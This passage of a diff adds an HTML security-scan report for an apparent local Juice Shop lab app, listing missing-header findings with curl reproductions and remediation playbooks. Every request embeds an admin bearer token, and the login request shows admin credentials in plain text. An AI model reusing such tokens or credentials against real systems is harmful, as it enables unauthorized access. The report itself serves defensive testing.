+  &#x27;http://localhost:3000/rest/products/search?q=&#x27; \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/rest/products/{id}/reviews<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/rest/products/1/reviews \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/products/1/reviews \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/rest/saveLoginIp<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/rest/saveLoginIp \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/saveLoginIp \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/rest/user/login<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  -X POST \
+  http://localhost:3000/rest/user/login \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Origin: http://localhost:3000&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27; \
+  --data-raw &#x27;{&quot;email&quot;: &quot;admin@juice-sh.op&quot;, &quot;password&quot;: &quot;admin123&quot;}&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/rest/user/whoami<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/rest/user/whoami \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/user/whoami \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Low</span></td><td>headers</td><td>Security Header Issue (Missing Permissions) — http://localhost:3000/api/Addresss<br><small>high confidence</small></td><td>Missing Permissions-Policy header.<br><code>curl \
+  http://localhost:3000/api/Addresss \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/api/Addresss \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
